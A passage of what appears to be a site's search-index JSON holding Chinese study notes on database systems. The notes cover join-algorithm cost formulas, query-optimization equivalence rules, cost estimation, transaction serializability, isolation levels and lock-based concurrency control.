<li>\u6700\u540e\u4e00\u6b21\u5f52\u5e76\u7684\u7ed3\u679c\u4e0d\u4e00\u5b9a\u9700\u8981\u5199\u5165\u78c1\u76d8\uff0c\u8fd9\u79cd\u60c5\u51b5\u603b\u5171\u9700\u8981 \\(b_r (2 \\lceil \\log_{M/b_b - 1} \\lceil b_r / M \\rceil \\rceil + 1)\\) \u6b21 transfer</li> </ul> </li> <li>seek \u6b21\u6570\uff1a<ul> <li>\u521b\u5efa\u521d\u59cb\u5f52\u5e76\u6bb5\u9700\u8981 \\(2 \\times N\\) \u6b21 seek</li> <li>\u6bcf\u6b21\u5f52\u5e76\u9700\u8981 \\(2 \\times \\lceil b_r / b_b \\rceil\\) \u6b21 seek</li> <li>\u6700\u540e\u4e00\u6b21\u5f52\u5e76\u7684\u7ed3\u679c\u4e0d\u4e00\u5b9a\u9700\u8981\u5199\u5165\u78c1\u76d8\uff0c\u8fd9\u79cd\u60c5\u51b5\u603b\u5171\u9700\u8981 \\(\\lceil b_r / b_b \\rceil (2 \\lceil \\log_{M/b_b - 1} \\lceil b_r / M \\rceil \\rceil - 1) + 2 \\lceil b_r / M \\rceil\\) \u6b21 seek</li> </ul> </li> </ul>"},{"location":"cs/database/review/#join-operation","title":"Join Operation","text":"<ol> <li>Nested-loop join\uff1a\u4e24\u91cd\u5faa\u73af\uff0c\u5916\u5faa\u73af r\uff0c\u5185\u5faa\u73af s<ul> <li>transfer \u6b21\u6570\uff1a\\(b_r + n_r \\times b_s\\)</li> <li>seek \u6b21\u6570\uff1a\\(n_r + b_r\\)</li> </ul> </li> <li>Block nested-loop join\uff1a\u5916\u5faa\u73af r \u7684\u5757\uff0c\u5185\u5faa\u73af s \u7684\u5757\uff0c\u6bcf\u6b21\u5bf9\u4e24\u4e2a\u5757\u505a nested-loop join<ul> <li>transfer \u6b21\u6570\uff1a\\(b_r + b_r \\times b_s\\)</li> <li>seek \u6b21\u6570\uff1a\\(2 \\times b_r\\)</li> <li>\u5c06\u8f83\u5c0f\u7684\u5173\u7cfb\u4f5c\u4e3a\u5916\u5173\u7cfb\u80fd\u51cf\u5c11\u4ee3\u4ef7\u3002</li> <li>\u5982\u679c\u5206\u914d \\(M - 2\\) \u5757\u7ed9 r\uff0c\\(1\\) \u5757\u7ed9 s\uff0c\u90a3\u4e48<ul> <li>transfer \u6b21\u6570\uff1a\\(b_r + \\lceil b_r / (M - 2) \\rceil \\times b_s\\)</li> <li>seek \u6b21\u6570\uff1a\\(2\\lceil b_r / (M - 2) \\rceil\\)</li> </ul> </li> </ul> </li> <li>Index nested-loop join\uff1a\u5982\u679c s \u4e0a\u6709\u7d22\u5f15\uff0c\u53ef\u4ee5\u7528\u7d22\u5f15\u627e\u5230\u6ee1\u8db3\u6761\u4ef6\u7684\u8bb0\u5f55<ul> <li>\u65f6\u95f4\u82b1\u8d39\uff1a\\(b_r(t_s + t_t) + n_r \\times c\\)\uff0c\\(c\\) \u4e3a\u6bcf\u6b21\u7d22\u5f15\u67e5\u627e\u82b1\u8d39\u7684\u65f6\u95f4</li> </ul> </li> <li>Merge join\uff1a\u4e24\u4e2a\u5173\u7cfb\u90fd\u6709\u5e8f\uff0c\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5f52\u5e76<ul> <li>transfer \u6b21\u6570\uff1a\\(b_r + b_s\\)</li> <li>seek \u6b21\u6570\uff1a\\(b_r + b_s\\) \u6700\u574f\u60c5\u51b5\u662f\u5728\u4e24\u4e2a\u5173\u7cfb\u4e2d\u5207\u6362</li> <li>\u5c06 M \u5757\u5185\u5b58\u5206\u4e3a \\(x_r + x_s\\) \u5757\uff0c\\(x_r\\) \u5757\u7528\u6765\u5b58\u50a8 r\uff0c\\(x_s\\) \u5757\u7528\u6765\u5b58\u50a8 s\uff0c\u90a3\u4e48<ul> <li>transfer \u6b21\u6570\uff1a\\(b_r + b_s\\)</li> <li>seek \u6b21\u6570\uff1a\\(\\lceil b_r / x_r \\rceil + \\lceil b_s / x_s \\rceil\\)</li> <li>\u9009\u62e9 \\(x_r = \\frac{\\sqrt{b_r}}{\\sqrt{b_r} + \\sqrt{b_s}} \\times M\\) \u548c \\(x_s = \\frac{\\sqrt{b_s}}{\\sqrt{b_r} + \\sqrt{b_s}} \\times M\\) \u53ef\u4ee5\u6700\u5c0f\u5316 seek \u6b21\u6570</li> </ul> </li> </ul> </li> <li>Hash join: \u5c06\u4e24\u4e2a\u5173\u7cfb\u7528\u76f8\u540c\u7684 hash \u51fd\u6570\u8fdb\u884c\u5212\u5206\uff0chash \u540e\u5c06\u539f\u6570\u636e\u5206\u4e3a \\(n\\) \u4e2a\u57df\uff0c\u7136\u540e\u5bf9\u6bcf\u4e2a\u57df\u8fdb\u884c join<ul> <li>\u9700\u8981\u6ee1\u8db3 \\(n \\geq \\lceil b_s / M \\rceil\\)\uff0c\u5373\u6bcf\u4e2a\u57df\u80fd\u4e00\u6b21\u6027\u653e\u5165\u5185\u5b58\u4e2d\u3002\u5982\u679c\u653e\u4e0d\u4e0b\uff0c\u53ef\u4ee5\u8fdb\u884c\u4e8c\u6b21\u5212\u5206</li> <li>s \u79f0\u4e3a build relation\uff0cr \u79f0\u4e3a probe relation</li> <li>\u8fc7\u7a0b\uff1a<ol> <li>\u5bf9 s \u8fdb\u884c hash \u5212\u5206\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u5212\u5206\uff0c\u4e3a\u5176\u5728\u5185\u5b58\u4e2d\u5206\u914d\u4e00\u4e2a\u5757\u7528\u4e8e\u5199\u56de</li> <li>\u5bf9 r \u8fdb\u884c hash \u5212\u5206</li> <li>\u5bf9\u4e8e\u6bcf\u4e2a\u5212\u5206\uff1a<ol> <li>\u8bfb\u53d6 s \u7684\u4e00\u4e2a\u5212\u5206\u5230\u5185\u5b58\u4e2d\uff0c\u5728\u5185\u5b58\u4e2d\u5efa\u7acb hash \u7d22\u5f15</li> <li>\u5c06 r \u7684\u5212\u5206\u4e00\u5757\u4e00\u5757\u8bfb\u53d6\u5230\u5185\u5b58\u4e2d\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u5757\u4e2d\u6bcf\u6761\u8bb0\u5f55\uff0c\u67e5\u627e hash \u7d22\u5f15\uff0c\u627e\u5230\u6ee1\u8db3\u6761\u4ef6\u7684\u8bb0\u5f55\u8fdb\u884c\u8f93\u51fa</li> </ol> </li> </ol> </li> <li>recursive partitioning\uff1a\u5982\u679c\u4e00\u4e2a\u57df\u4e0d\u80fd\u653e\u5165\u5185\u5b58\u4e2d\uff0c\u53ef\u4ee5\u8fdb\u884c\u4e8c\u6b21\u5212\u5206\uff0c\u76f4\u5230\u53ef\u4ee5\u653e\u5165\u5185\u5b58\u4e2d\uff0c\u6b64\u65f6 \\(M &gt; \\lceil b_s / n \\rceil + 1\\)\uff0c\u8fd1\u4f3c\u4e3a \\(M &gt; \\sqrt{b_s}\\)</li> <li>\u4ee3\u4ef7\u4f30\u7b97\uff1a<ul> <li>\u5982\u679c\u4e0d\u9700\u8981 recursive partitioning<ul> <li>transfer \u6b21\u6570\uff1a\\(2(b_r + b_s) + b_r + b_s = 3(b_r + b_s)\\)\uff0c\u5212\u5206\u65f6\u8bfb\u53d6\u5199\u5165\u5404\u4e00\u6b21\uff0cjoin \u65f6\u8bfb\u53d6\u4e00\u6b21\uff08\u5b9e\u9645\u53ef\u80fd\u6bd4\u8fd9\u4e2a\u503c\u5927\uff0c\u56e0\u4e3a\u53ef\u80fd\u6709\u4e9b\u5757\u4e0d\u6ee1\uff09</li> <li>seek \u6b21\u6570\uff1a\\(2 (\\lceil b_r / b_b \\rceil + \\lceil b_s / b_b \\rceil)\\)\uff0c\u5212\u5206\u65f6 seek \u4e00\u6b21\uff0cjoin \u65f6 seek \u4e00\u6b21</li> </ul> </li> <li>\u5982\u679c\u9700\u8981 recursive partitioning\uff0c\u4f1a\u8fdb\u884c \\(\\lceil \\log_{M/b_b - 1}\\lceil b_s / M \\rceil \\rceil\\) \u6b21\u5212\u5206<ul> <li>transfer \u6b21\u6570\uff1a\\(2(b_r+b_s)\\times \\lceil \\log_{M/b_b - 1}\\lceil b_s / M \\rceil \\rceil + b_r + b_s\\)</li> <li>seek \u6b21\u6570 \\(2 (\\lceil b_r / b_b \\rceil + \\lceil b_s / b_b \\rceil) \\times \\lceil \\log_{M/b_b - 1}\\lceil b_s / M \\rceil \\rceil\\)</li> </ul> </li> </ul> </li> </ul> </li> </ol>"},{"location":"cs/database/review/#query-optimization","title":"Query Optimization \u67e5\u8be2\u4f18\u5316","text":""},{"location":"cs/database/review/#equivalence-rules","title":"Equivalence Rules","text":"<ul> <li>Conjunctive Selection deconstruct\uff1a\\(\\sigma_{\\theta_1 \\land \\theta_2}(r) \\equiv \\sigma_{\\theta_1}(\\sigma_{\\theta_2}(r))\\)</li> <li>Selection commutativity\uff1a\\(\\sigma_{\\theta_1}(\\sigma_{\\theta_2}(r)) \\equiv \\sigma_{\\theta_2}(\\sigma_{\\theta_1}(r))\\)</li> <li>Projection omission\uff1a\\(\\Pi_{L_1}(\\Pi_{L_2}(...(\\Pi_{L_n}(r))...)) \\equiv \\Pi_{L_1}(r)\\)\uff0c\u53ea\u4fdd\u7559\u6700\u540e\u4e00\u4e2a projection</li> <li>\u9009\u62e9\u64cd\u4f5c\u548c\u7b1b\u5361\u5c14\u79ef\u5d4c\u5957\uff1a<ul> <li>\\(\\sigma_{\\theta}(r \\times s) \\equiv r \\bowtie_{\\theta} s\\)</li> <li>\\(\\sigma_{\\theta_1}(r \\bowtie_{\\theta_2} s) \\equiv r \\bowtie_{\\theta_2 \\land \\theta_1} s\\)</li> </ul> </li> <li>Theta join commutativity\uff1a\\(r \\bowtie_{\\theta} s \\equiv s \\bowtie_{\\theta} r\\)</li> <li>associativity\uff1a<ul> <li>Natural join associativity\uff1a\\(r \\bowtie s \\bowtie t \\equiv r \\bowtie (s \\bowtie t) \\equiv (r \\bowtie s) \\bowtie t\\)</li> <li>Theata join \u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u53ef\u7ed3\u5408\uff1a\\((r \\bowtie_{\\theta_1} s) \\bowtie_{\\theta_2 \\land \\theta_3} t \\equiv r \\bowtie_{\\theta_1 \\land \\theta_3} (s \\bowtie_{\\theta_2} t)\\)\uff0c\u5176\u4e2d \\(\\theta_2\\) \u53ea\u548c s \u548c t \u6709\u5173</li> </ul> </li> <li>\u6295\u5f71\u5728 theta join \u4e2d\u7684\u5206\u914d<ul> <li>\u5982\u679c \\(\\theta\\) \u53ea\u5305\u542b\u4e86 \\(L_1 \\cup L_2\\) \u4e2d\u7684\u5c5e\u6027     \\(\\Pi_{L_1 \\cup L_2}(r \\bowtie_{\\theta} s) \\equiv \\Pi_{L_1}(r) \\bowtie_{\\theta} \\Pi_{L_2}(s)\\)</li> <li>\u5426\u5219\uff0c\u8bbe \\(\\theta\\) \u5305\u542b\u4e86 \\(r\\) \u4e2d\u7684\u5c5e\u6027 \\(L_1 \\cup L_3\\)\uff0c\\(s\\) \u4e2d\u7684\u5c5e\u6027 \\(L_2 \\cup L_4\\)\uff0c\u90a3\u4e48     \\(\\Pi_{L_1 \\cup L_2}(r \\bowtie_{\\theta} s) \\equiv \\Pi_{L_1 \\cup L_2}(\\Pi_{L_1 \\cup L_3}(r) \\bowtie_{\\theta} \\Pi_{L_2 \\cup L_4}(s))\\)</li> </ul> </li> </ul>"},{"location":"cs/database/review/#cost-estimation","title":"Cost Estimation","text":"<p>Statics:</p> <ul> <li>\\(n_r\\)\uff1ar \u4e2d\u7684\u8bb0\u5f55\u6570</li> <li>\\(b_r\\)\uff1a\u5b58\u50a8 r \u7684\u5757\u6570</li> <li>\\(l_r\\)\uff1ar \u6bcf\u6761\u8bb0\u5f55\u7684\u5927\u5c0f</li> <li>\\(f_r\\)\uff1ablocking factor of r\uff0c\u6bcf\u4e2a\u5757\u4e2d\u7684\u8bb0\u5f55\u6570</li> <li> <p>\\(V(A, r)\\)\uff1ar \u4e2d\u5c5e\u6027 A \u7684\u4e0d\u540c\u503c\u7684\u6570\u91cf</p> </li> <li> <p>\\(\\sigma_{A = V}(r)\\)</p> <ul> <li>\u4f30\u8ba1\u9009\u4e2d\u7684\u8bb0\u5f55\u6570\uff1a\\(n_r / V(A, r)\\)</li> </ul> </li> <li>\\(\\sigma_{A \\leq V}(r)\\)<ul> <li>\u5982\u679c\u53ef\u4ee5\u83b7\u5f97 \\(\\min(A, r)\\) \u548c \\(\\max(A, r)\\)\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f30\u8ba1\u9009\u4e2d\u7684\u8bb0\u5f55\u6570<ul> <li>\u5982\u679c \\(V &lt; \\min(A, r)\\)\uff0c\u90a3\u4e48\u9009\u4e2d\u7684\u8bb0\u5f55\u6570\u4e3a \\(0\\)</li> <li>\u5982\u679c \\(V &gt; \\max(A, r)\\)\uff0c\u90a3\u4e48\u9009\u4e2d\u7684\u8bb0\u5f55\u6570\u4e3a \\(n_r\\)</li> <li>\u5426\u5219\uff0c\u9009\u4e2d\u7684\u8bb0\u5f55\u6570\u4e3a \\(\\frac{V - \\min(A, r)}{\\max(A, r) - \\min(A, r)} \\times n_r\\)</li> </ul> </li> <li>\u5982\u679c\u65e0\u6cd5\u83b7\u5f97\uff0c\u90a3\u4e48\u4f30\u8ba1\u9009\u4e2d\u7684\u8bb0\u5f55\u6570\u4e3a \\(n_r / 2\\)</li> </ul> </li> <li>\u8bbe\u6761\u4ef6 \\(\\theta_i\\) \u7684\u9009\u7387\u4e3a \\(s_i/n_r\\)\uff0c\u5047\u8bbe\u6761\u4ef6\u76f4\u63a5\u76f8\u4e92\u72ec\u7acb<ul> <li>\\(\\sigma_{\\theta_1 \\land \\cdots \\land \\theta_n}(r)\\)\uff0c\u9009\u4e2d\u7684\u8bb0\u5f55\u6570\u4e3a \\(n_r \\times \\prod_{i=1}^n s_i/n_r\\)</li> <li>\\(\\sigma_{\\theta_1 \\lor \\cdots \\lor \\theta_n}(r)\\)\uff0c\u9009\u4e2d\u7684\u8bb0\u5f55\u6570\u4e3a \\(n_r \\times (1 - \\prod_{i=1}^n (1 - s_i/n_r))\\)</li> </ul> </li> <li>\\(r \\bowtie_\\theta s\\)<ul> <li>\u5982\u679c \\(r \\cap s = \\emptyset\\)\uff0c\u90a3\u4e48\u9009\u4e2d\u7684\u8bb0\u5f55\u6570\u4e3a \\(n_r \\times n_s\\)</li> <li>\u5982\u679c\u8fde\u63a5\u5c5e\u6027\u662f r \u7684 key\uff0c\u90a3\u4e48\u9009\u4e2d\u7684\u8bb0\u5f55\u6570 \\(n \\leq n_s\\)</li> <li>\u5982\u679c\u8fde\u63a5\u5c5e\u6027\u662f s \u6307\u5411 r \u7684\u5916\u952e\uff0c\u90a3\u4e48\u9009\u4e2d\u7684\u8bb0\u5f55\u6570 \\(n = n_s\\)</li> <li>\u5426\u5219\u4f30\u8ba1\u4e3a \\(\\min(\\frac{n_r}{V(A, r)}\\times n_s, \\frac{n_s}{V(A, s)}\\times n_r)\\)</li> </ul> </li> <li>\\(\\Pi_{A}(r)\\)<ul> <li>\u9009\u4e2d\u7684\u8bb0\u5f55\u6570\u4e3a \\(V(A, r)\\)</li> </ul> </li> <li>\u805a\u5408 \\(_G \\mathcal{G}_{f(A)}(r)\\)<ul> <li>\u9009\u4e2d\u7684\u8bb0\u5f55\u6570\u4e3a \\(V(A, r)\\)</li> </ul> </li> </ul>"},{"location":"cs/database/review/#_20","title":"\u4e8b\u52a1","text":"<p>\u7b80\u5316\u4e3a\u53ea\u6709 read \u548c write \u64cd\u4f5c\u7684\u4e8b\u52a1\u3002</p>"},{"location":"cs/database/review/#transaction-state","title":"Transaction State","text":"<ul> <li>active\uff1a\u4e8b\u52a1\u6b63\u5728\u6267\u884c</li> <li>partially committed\uff1a\u4e8b\u52a1\u6267\u884c\u5b8c\u6210\uff0c\u4f46\u662f\u8fd8\u6ca1\u6709\u63d0\u4ea4</li> <li>committed\uff1a\u4e8b\u52a1\u6267\u884c\u5b8c\u6210\u5e76\u4e14\u63d0\u4ea4</li> <li>failed\uff1a\u4e8b\u52a1\u6267\u884c\u5931\u8d25</li> <li>aborted\uff1a\u4e8b\u52a1\u6267\u884c\u5931\u8d25\u5e76\u4e14\u56de\u6eda</li> </ul>"},{"location":"cs/database/review/#concurrency-execution","title":"Concurrency Execution","text":""},{"location":"cs/database/review/#_21","title":"\u5178\u578b\u9519\u8bef","text":"<ol> <li>Lost update: \u4e24\u4e2a\u4e8b\u52a1\u540c\u65f6\u8bfb\u53d6\u4e00\u4e2a\u503c\uff0c\u7136\u540e\u4fee\u6539\uff0c\u7136\u540e\u5199\u56de\uff0c\u4f1a\u5bfc\u81f4\u4e00\u4e2a\u4e8b\u52a1\u7684\u4fee\u6539\u88ab\u53e6\u4e00\u4e2a\u4e8b\u52a1\u8986\u76d6\u3002</li> <li>Dirty read: \u4e00\u4e2a\u4e8b\u52a1\u8bfb\u53d6\u4e86\u53e6\u4e00\u4e2a\u4e8b\u52a1\u672a\u63d0\u4ea4\u7684\u6570\u636e\uff0c\u7136\u540e\u53e6\u4e00\u4e2a\u4e8b\u52a1\u56de\u6eda\uff0c\u5bfc\u81f4\u8bfb\u53d6\u7684\u6570\u636e\u662f\u810f\u6570\u636e\u3002</li> <li>Unrepeatable read: \u4e00\u4e2a\u4e8b\u52a1\u8bfb\u53d6\u4e86\u4e00\u4e2a\u503c\uff0c\u7136\u540e\u53e6\u4e00\u4e2a\u4e8b\u52a1\u4fee\u6539\u4e86\u8fd9\u4e2a\u503c\uff0c\u5bfc\u81f4\u7b2c\u4e00\u4e2a\u4e8b\u52a1\u518d\u6b21\u8bfb\u53d6\u65f6\u503c\u4e0d\u540c\u3002</li> <li>Phantom read: \u4e00\u4e2a\u4e8b\u52a1\u8bfb\u53d6\u4e86\u4e00\u4e2a\u8303\u56f4\u5185\u7684\u503c\uff0c\u7136\u540e\u53e6\u4e00\u4e2a\u4e8b\u52a1\u63d2\u5165\u4e86\u4e00\u4e2a\u65b0\u7684\u503c\uff0c\u5bfc\u81f4\u7b2c\u4e00\u4e2a\u4e8b\u52a1\u518d\u6b21\u8bfb\u53d6\u65f6\u8303\u56f4\u5185\u7684\u503c\u4e0d\u540c\u3002</li> </ol>"},{"location":"cs/database/review/#schedule","title":"Schedule","text":"<p>\u8c03\u5ea6\uff0c\u4e8b\u52a1\u6267\u884c\u987a\u5e8f\u3002</p> <ul> <li>\u4e32\u884c\u8c03\u5ea6\uff1a\u4e8b\u52a1\u6309\u7167\u987a\u5e8f\u6267\u884c\uff0c\u4e00\u4e2a\u4e8b\u52a1\u6267\u884c\u5b8c\u540e\u53e6\u4e00\u4e2a\u4e8b\u52a1\u518d\u6267\u884c\uff0c\u4e00\u5b9a\u662f\u9694\u79bb\u7684</li> <li>\u975e\u4e32\u884c\u8c03\u5ea6\uff1a\u4e8b\u52a1\u5e76\u53d1\u6267\u884c\uff0c\u4ea4\u53c9\u8c03\u5ea6\u3002\u5982\u679c\u80fd\u591f\u4ea4\u6362\u5355\u4e2a\u4e0d\u51b2\u7a81\u7684\u64cd\u4f5c\u7684\u6267\u884c\u987a\u5e8f\u4f7f\u5f97\u7ed3\u679c\u548c\u4e32\u884c\u8c03\u5ea6\u4e00\u81f4\uff0c\u90a3\u4e48\u6267\u884c\u7ed3\u679c\u548c\u4e32\u884c\u8c03\u5ea6\u4e00\u81f4\u3002</li> </ul>"},{"location":"cs/database/review/#serializability","title":"Serializability","text":"<p>\u5982\u679c\u4e00\u4e2a\u4ea4\u53c9\u8c03\u5ea6\u5982\u679c\u7b49\u4ef7\u4e8e\u4e00\u4e2a\u4e32\u884c\u8c03\u5ea6\uff0c\u90a3\u4e48\u8fd9\u4e2a\u4ea4\u53c9\u8c03\u5ea6\u662f\u53ef\u4e32\u884c\u5316\u7684\u3002</p> <p>\u4e00\u5bf9\u51b2\u7a81\u7684\u64cd\u4f5c\u7684\u987a\u5e8f\u51b3\u5b9a\u53ef\u4e32\u884c\u5316\u7684\u4ea4\u53c9\u8c03\u5ea6\u7b49\u4ef7\u7684\u4e32\u884c\u8c03\u5ea6\u7684\u987a\u5e8f\uff1a\u5982\u679c \\(T_1\\) \u5148\u6267\u884c \\(\\mathrm{read}(Q)\\)\uff0c\u7136\u540e \\(T_2\\) \u6267\u884c \\(\\mathrm{write}(Q)\\)\uff0c\u90a3\u4e48\u7b49\u4ef7\u7684\u4e32\u884c\u8c03\u5ea6\u4e2d\uff0c\\(T_1\\) \u5728 \\(T_2\\) \u4e4b\u524d\u6267\u884c\u3002</p>"},{"location":"cs/database/review/#test-for-serializability","title":"Test for Serializability","text":"<p>precedence graph \u524d\u9a71\u56fe\uff1a\u5982\u679c \\(T_i\\) \u4e2d\u80fd\u591f\u627e\u5230\u4e00\u4e2a\u64cd\u4f5c\u9700\u8981\u5148\u4e8e \\(T_j\\) \u4e2d\u7684\u64cd\u4f5c\u6267\u884c\uff0c\u90a3\u4e48\u5728\u56fe\u4e2d\u6dfb\u52a0\u4e00\u6761\u8fb9 \\(T_i \\rightarrow T_j\\)\u3002</p> <p>\u5982\u679c\u627e\u5230\u4e00\u4e2a\u73af\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8c03\u5ea6\u662f\u4e0d\u53ef\u4e32\u884c\u5316\u7684\u3002</p>"},{"location":"cs/database/review/#different-forms","title":"Different Forms","text":"<ul> <li>conflict serializability\uff1a\u5982\u4e0a</li> <li>view serializability\uff1a\u5bf9\u4e8e\u975e\u4e32\u884c\u5316\u8c03\u5ea6\u548c\u4e32\u884c\u5316\u8c03\u5ea6\uff0c\u5982\u679c\u521d\u59cb\u503c\u7531\u540c\u4e00\u4e2a\u4e8b\u52a1\u8bfb\u53d6\uff0c\u4e2d\u95f4\u503c\u7531\u540c\u4e00\u4e2a\u4e8b\u52a1\u5199\u5165\uff0c\u518d\u7531\u540c\u4e00\u4e2a\u4e8b\u52a1\u8bfb\u53d6\uff0c\u6700\u7ec8\u503c\u7531\u540c\u4e00\u4e2a\u4e8b\u52a1\u5199\u5165\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8c03\u5ea6\u662f view serializable \u7684\u3002     \u51b2\u7a81\u53ef\u4e32\u884c\u5316\u90fd\u662f\u89c6\u56fe\u53ef\u4e32\u884c\u5316\u7684\uff0c\u53cd\u4e4b\u4e0d\u4e00\u5b9a\u3002</li> </ul>"},{"location":"cs/database/review/#recoverable-schedule","title":"Recoverable Schedule","text":"<p>\u5982\u679c\u4e8b\u52a1 \\(T_i\\) \u8bfb\u53d6\u4e86\u4e8b\u52a1 \\(T_j\\) \u7684\u810f\u6570\u636e\uff0c\u90a3\u4e48 \\(T_j\\) \u5fc5\u987b\u5728 \\(T_i\\) \u4e4b\u524d\u63d0\u4ea4\u3002</p>"},{"location":"cs/database/review/#cascading-rollback","title":"Cascading Rollback","text":"<p>\u5982\u679c\u4e8b\u52a1 \\(T_i\\) \u8bfb\u53d6\u4e86\u4e8b\u52a1 \\(T_j\\) \u7684\u810f\u6570\u636e\uff0c\u7136\u540e \\(T_k\\) \u8bfb\u53d6\u4e86 \\(T_i\\) \u7684\u810f\u6570\u636e\uff0c\u90a3\u4e48 \\(T_j\\) \u56de\u6eda\uff0c\\(T_i, T_k\\) \u9700\u8981\u7ea7\u8054\u56de\u6eda\u3002</p> <p>\u8981\u907f\u514d\u53d1\u751f\u7ea7\u8054\u56de\u6eda\uff0c\u5426\u5219\u5f00\u9500\u4f1a\u5f88\u5927\u3002</p>"},{"location":"cs/database/review/#transaction-isolation-level","title":"Transaction Isolation Level","text":"<ol> <li>Serializable\uff1a\u9ed8\u8ba4\u7ea7\u522b\uff0c\u6700\u9ad8\u7ea7\u522b\uff0c\u4fdd\u8bc1\u4e8b\u52a1\u4e32\u884c\u6267\u884c</li> <li>Repeatable read\uff1a\u4fdd\u8bc1\u6ca1\u6709\u91cd\u590d\u8bfb</li> <li>Read committed\uff1a\u4fdd\u8bc1\u4e0d\u8bfb\u53d6\u810f\u6570\u636e</li> <li>Read uncommitted\uff1a\u5141\u8bb8\u8bfb\u53d6\u810f\u6570\u636e</li> </ol>"},{"location":"cs/database/review/#concurrent-control","title":"Concurrent Control","text":"<p>\u5e76\u53d1\u63a7\u5236\u534f\u8bae</p> <ul> <li>Lock-based protocol\uff1a\u52a0\u9501</li> <li>Timestamp-based protocol\uff1a\u65f6\u95f4\u6233\uff0c\u4e8b\u52a1\u6309\u7167\u65f6\u95f4\u6233\u987a\u5e8f\u6267\u884c</li> <li>Validation-based protocol\uff1a\u4e8b\u52a1\u6267\u884c\u5b8c\u540e\u9a8c\u8bc1\u662f\u5426\u53ef\u4e32\u884c\u5316</li> </ul>"},{"location":"cs/database/review/#lock-based-protocol","title":"Lock-based Protocol","text":""},{"location":"cs/database/review/#lock","title":"Lock","text":"<ul> <li>exclusive lock (X)\uff1a\u6392\u4ed6\u9501\uff0c\u53ef\u4ee5\u8bfb\u5199</li> <li>shared lock (S)\uff1a\u5171\u4eab\u9501\uff0c\u7528\u4e8e\u8bfb\u64cd\u4f5c</li> </ul> <p>S \u4e0e S \u517c\u5bb9\uff0cS \u4e0e X \u4e0d\u517c\u5bb9\uff0cX \u4e0e X \u4e0d\u517c\u5bb9\u3002</p>"},{"location":"cs/database/review/#two-phase-locking-protocol","title":"Two-phase Locking Protocol","text":"<p>\u4e00\u4e2a\u4e8b\u52a1\u5206\u4e3a\u4e24\u4e2a\u9636\u6bb5\uff1a</p> <ol> <li>growing phase\uff1a\u4e8b\u52a1\u53ef\u4ee5\u83b7\u53d6\u9501\uff0c\u4f46\u662f\u4e0d\u80fd\u91ca\u653e\u9501</li> <li>shrinking phase\uff1a\u4e8b\u52a1\u53ef\u4ee5\u91ca\u653e\u9501\uff0c\u4f46\u662f\u4e0d\u80fd\u83b7\u53d6\u9501</li> </ol> <p>\u83b7\u5f97\u6700\u540e\u4e00\u4e2a\u9501\u7684\u65f6\u95f4\u70b9\u79f0\u4e3a\u4e8b\u52a1\u7684 lock point\u3002\u6309\u7167 lock point \u7684\u987a\u5e8f\u6267\u884c\u4e8b\u52a1\uff0c\u53ef\u4ee5\u4fdd\u8bc1\u53ef\u4e32\u884c\u5316\u3002</p> <p>\u57fa\u672c\u4e24\u9636\u6bb5\u5c01\u9501\u4e0d\u80fd\u4fdd\u8bc1\u53ef\u6062\u590d\u6027\u548c\u907f\u514d\u7ea7\u8054\u56de\u6eda\u3002</p> <ul> <li>Strict two-phase locking protocol \u4e25\u683c\u4e24\u9636\u6bb5\u5c01\u9501\u534f\u8bae\uff1a\u5728\u4e8b\u52a1\u63d0\u4ea4\u4e4b\u524d\u4e0d\u80fd\u91ca\u653e X \u9501\uff0c\u4fdd\u8bc1\u53ef\u4e32\u884c\u5316\u548c\u53ef\u6062\u590d\u6027</li> <li>Rigorous two-phase locking protocol \u5f3a\u4e24\u9636\u6bb5\u5c01\u9501\u534f\u8bae\uff1a\u5728\u4e8b\u52a1\u63d0\u4ea4\u4e4b\u524d\u4e0d\u80fd\u91ca\u653e\u4efb\u4f55\u9501\u3002</li> </ul>"},{"location":"cs/database/review/#lock-conversion","title":"Lock Conversion","text":"<ul> <li>First phase: lock upgrade\uff0c\u7b2c\u4e00\u9636\u6bb5\u53ef\u4ee5\u7533\u8bf7\u9501\u6216\u8005\u5347\u7ea7\u9501</li> <li>Second phase: lock downgrade\uff0c\u7b2c\u4e8c\u9636\u6bb5\u53ef\u4ee5\u964d\u7ea7\u9501\u6216\u8005\u91ca\u653e\u9501</li> </ul>"},{"location":"cs/database/review/#implementation-of-lock-based-protocol","title":"Implementation of Lock-based Protocol","text":"<p>lock table\uff1a\u7528 hash \u8868\u7684\u5f62\u5f0f\uff0c\u5bf9\u8bb0\u5f55 id \u5efa\u7acb hash \u8868\uff0c\u6bcf\u4e2a\u8bb0\u5f55\u4e0b\u6709\u4e00\u4e2a\u9501\u961f\u5217\u3002</p>"},{"location":"cs/database/review/#deadlock","title":"Deadlock","text":"<p>\u89e3\u51b3\u6b7b\u9501\u7684\u65b9\u6cd5\uff1a</p> <ul> <li>\u4e00\u6b21\u6027\u5206\u914d\u6240\u6709\u9501</li> <li>Impose partial order\uff1a\u5bf9\u6570\u636e\u8bbf\u95ee\u987a\u5e8f\u8fdb\u884c\u9650\u5236</li> <li>Timeout-based scheme\uff1a\u8d85\u65f6\u56de\u6eda</li> </ul>"},{"location":"cs/database/review/#deadlock-detection","title":"Deadlock Detection","text":"<p>\u5b9a\u671f\u68c0\u6d4b\u6b7b\u9501\uff0c\u7136\u540e\u56de\u6eda\u4e00\u4e2a\u4e8b\u52a1\u3002</p> <p>\u5efa\u7acb\u7b49\u5f85\u56fe\uff0c\u5982\u679c\u4e8b\u52a1 \\(T_i\\) \u7b49\u5f85\u4e8b\u52a1 \\(T_j\\) \u7684\u9501\uff0c\u90a3\u4e48\u5728\u56fe\u4e2d\u6dfb\u52a0\u4e00\u6761\u8fb9 \\(T_i \\rightarrow T_j\\)\u3002</p>"},{"location":"cs/database/review/#graph-based-protocol","title":"Graph-based Protocol","text":"<p>\u5047\u5982\u77e5\u9053\u6570\u636e\u6309\u7167\u504f\u5e8f\u8bbf\u95ee\uff0c\u90a3\u4e48\u53ef\u4ee5\u901a\u8fc7\u56fe\u6765\u6267\u884c\u4e8b\u52a1\u3002</p>"},{"location":"cs/database/review/#tree-protocol","title":"Tree Protocol","text":"<ul> <li>\u53ea\u6709 X \u9501</li> 